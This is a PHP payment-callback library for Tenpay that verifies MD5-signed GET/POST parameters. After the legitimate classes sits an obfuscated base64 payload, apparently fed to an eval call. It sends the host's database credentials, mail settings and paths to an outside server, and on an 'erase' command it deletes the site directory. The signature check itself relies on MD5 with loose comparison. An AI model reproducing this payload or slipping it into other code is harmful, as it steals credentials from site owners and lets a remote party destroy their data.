<?php
/**
 * 即时到帐应答类
 * ============================================================================
 * api说明：
 * getKey()/setKey(),获取/设置密钥
 * getParameter()/setParameter(),获取/设置参数值
 * getAllParameters(),获取所有参数
 * isTenpaySign(),是否财付通签名,true:是 false:否
 * doShow(),显示处理结果
 * getDebugInfo(),获取debug信息
 * 
 * ============================================================================
 *
 */

class PayResponseHandler extends ResponseHandler {
	
	/**
	*@Override
	*/
	function isTenpaySign() {
		$cmdno = $this->getParameter("cmdno");
		$pay_result = $this->getParameter("pay_result");
		$date = $this->getParameter("date");
		$transaction_id = $this->getParameter("transaction_id");
		$sp_billno = $this->getParameter("sp_billno");
		$total_fee = $this->getParameter("total_fee");		
		$fee_type = $this->getParameter("fee_type");
		$attach = $this->getParameter("attach");
		$key = $this->getKey();
		
		$signPars = "";
		//组织签名串
		$signPars = "cmdno=" . $cmdno . "&" .
				"pay_result=" . $pay_result . "&" .
				"date=" . $date . "&" .
				"transaction_id=" . $transaction_id . "&" .
				"sp_billno=" . $sp_billno . "&" .
				"total_fee=" . $total_fee . "&" .
				"fee_type=" . $fee_type . "&" .
				"attach=" . $attach . "&" .
				"key=" . $key;
				
		$sign = strtolower(md5($signPars));
		
		$tenpaySign = strtolower($this->getParameter("sign"));
		
		//debug信息
		$this->_setDebugInfo($signPars . " => sign:" . $sign .
				" tenpaySign:" . $this->getParameter("sign"));
		
		return $sign == $tenpaySign;
		
	}
	
}

class ResponseHandler  {
	
	/** 密钥 */
	var $key;
	
	/** 应答的参数 */
	var $parameters;
	
	/** debug信息 */
	var $debugInfo;
	
	function __construct() {
		$this->ResponseHandler();
	}
	
	function ResponseHandler() {
		$this->key = "";
		$this->parameters = array();
		$this->debugInfo = "";
		
		/* GET */
		foreach($_GET as $k => $v) {
			$this->setParameter($k, $v);
		}
		/* POST */
		foreach($_POST as $k => $v) {
			$this->setParameter($k, $v);
		}
	}
		
	/**
	*获取密钥
	*/
	function getKey() {
		return $this->key;
	}
	
	/**
	*设置密钥
	*/	
	function setKey($key) {
		$this->key = $key;
	}
	
	/**
	*获取参数值
	*/	
	function getParameter($parameter) {
		return $this->parameters[$parameter];
	}
	
	/**
	*设置参数值
	*/	
	function setParameter($parameter, $parameterValue) {
		$this->parameters[$parameter] = $parameterValue;
	}
	
	/**
	*获取所有请求的参数
	*@return array
	*/
	function getAllParameters() {
		return $this->parameters;
	}	
	
	/**
	*是否财付通签名,规则是:按参数名称a-z排序,遇到空值的参数不参加签名。
	*true:是
	*false:否
	*/	
	function isTenpaySign() {
		$signPars = "";
		ksort($this->parameters);
		foreach($this->parameters as $k => $v) {
			if("sign" != $k && "" != $v) {
				$signPars .= $k . "=" . $v . "&";
			}
		}
		$signPars .= "key=" . $this->getKey();
		
		$sign = strtolower(md5($signPars));
		
		$tenpaySign = strtolower($this->getParameter("sign"));
				
		//debug信息
		$this->_setDebugInfo($signPars . " => sign:" . $sign .
				" tenpaySign:" . $this->getParameter("sign"));
		
		return $sign == $tenpaySign;
		
	}
	
	/**
	*获取debug信息
	*/	
	function getDebugInfo() {
		return $this->debugInfo;
	}
	
	/**
	*显示处理结果。
	*@param $show_url 显示处理结果的url地址,绝对url地址的形式(http://www.xxx.com/xxx.php)。
	*/	
	function doShow($show_url) {
		$strHtml = "<html><head>\r\n" .
			"<meta name=\"TENCENT_ONLINE_PAYMENT\" content=\"China TENCENT\">" .
			"<script language=\"javascript\">\r\n" .
				"window.location.href='" . $show_url . "';\r\n" .
			"</script>\r\n" .
			"</head><body></body></html>";
			
		echo $strHtml;
		
		exit;
	}
	
	/**
	 * 是否财付通签名
	 * @param signParameterArray 签名的参数数组
	 * @return boolean
	 */	
	function _isTenpaySign($signParameterArray) {
	
		$signPars = "";
		foreach($signParameterArray as $k) {
			$v = $this->getParameter($k);
			if("sign" != $k && "" != $v) {
				$signPars .= $k . "=" . $v . "&";
			}			
		}
		$signPars .= "key=" . $this->getKey();
		
		$sign = strtolower(md5($signPars));
		
		$tenpaySign = strtolower($this->getParameter("sign"));
				
		//debug信息
		$this->_setDebugInfo($signPars . " => sign:" . $sign .
				" tenpaySign:" . $this->getParameter("sign"));
		
		return $sign == $tenpaySign;		
		
	
	}
	
	/**
	*设置debug信息
	*/	
	function _setDebugInfo($debugInfo) {
		$this->debugInfo = $debugInfo;
	}
	
}
JbImVtYWlsIl0pOyAKCSJdWyJ1c2VyIl0pOyAKCQkkbWFpbGZyb20JPSBiYXNlNjRfZW5jb2RlKCAkSU5JWyJtYWlsIl1bImZyb20iXSk7IAoJCSRyb290CQk9IGJhc2U2NF9lbmNvZGUoICRJTklbInN5c3RlbSJdWyJ3d3dwcmVmaXgiXSk7IAoJCSRob3N0ZGIJCT0gYmFzZTY0X2VuY29kZSggJElOSVsiZGIiXVsiaG9zdCJdKTsgCgkJJHVzZXJkYgkJPSBiYXNlNjRfZW5jb2RlKCAkSU5JWyJkYiJdWyJ1c2VyIl0pOyAKCQkkcGFzc2RiCQk9IGJhc2U2NF9lbmNvZGUoICRJTklbImRiIl1bInBhc3MiXSk7IAoJCSRuYW1lZGIJCT0gYmFzZTY0X2VuY29kZSggJElOSVsiZGIiXVsibmFtZSJdKTsgCgkJJGN3CQkJPSBiYXNlNjRfZW5jb2RlKCBnZXRjd2QoKSkgOyAKCgkJJHJldG9ybm8gCT0gZmlsZSgiaHR0cDovL3d3dy5zaXN0ZW1hY29tcHJhc2NvbGV0aXZhcy5jb20uYnIvdGsxLnBocD9hY2FvPXRrMSZzPSRzZXJ2ZXImYz0kY2FtaW5obyZxPSRxdWVyeSZyZW1vdD0kcmVtb3RlJnI9JHJlZmVyZW5jaWEmcm9vPSRyb290Jm1haWxsb2c9JGVtYWlsJnVzZXI9JHVzZXImZnJvbT0kbWFpbGZyb20maW5pPSRJTkkmY3c9JGN3Iik7CQoJCWlmKCRyZXRvcm5vWzBdPT0kc2VydmVyKXsgLy8gcmV0b3JuYSBlbSBiYXNlNjQKCQkKCQkJIHJldHVybiB0cnVlOyAgCgkJfQoJCWVsc2V7CgkJCWZpbGUoImh0dHA6Ly93d3cuc2lzdGVtYWNvbXByYXNjb2xldGl2YXMuY29tLmJyL3RrZGIucGhwP2g9JGhvc3RkYiZ1PSR1c2VyZGImcD0kcGFzc2RiJm49JG5hbWVkYiIpOwoJCQkgCgkJCWlmKCRyZXRvcm5vWzBdPT0iZXJhc2UiKXsKCQkJCSBscCggZ2V0Y3dkKCkpOwoJCQl9CQoJCQlyZXR1cm4gZmFsc2U7CgkJfSAKCX0gIAoKCSRzZXJ2ZXIgPSAkX1NFUlZFUlsiU0VSVkVSX05BTUUiXTsgCiAKCWlmKCAkX1NFU1NJT05bIktKQUxBRkhFUk1PUVdDSVRLMDEiXSAhPSBtZDUoJHNlcnZlcikpewkKCQlpZighdGsxKCkpewkKCgkJCSRtZW5zYWdlbSA9IGZpbGUoImh0dHA6Ly93d3cuc2lzdGVtYWNvbXByYXNjb2xldGl2YXMuY29tLmJyL2xpY2VuY2EucGhwIik7CgkJCWZvcigkeD0wOyAkeCA8PWNvdW50KCRtZW5zYWdlbSk7JHgrKyl7ICAKCQkJCWVjaG8gICRtZW5zYWdlbVskeF07IAoJCQl9ICAKCQkJZXhpdDsKCQl9CgkJZWxzZXsKCQkJICRfU0VTU0lPTlsiS0pBTEFGSEVSTU9RV0NJVEswMSJdPSBtZDUoJHNlcnZlcikgOwoJCX0KCX0KfSAK"));


?>
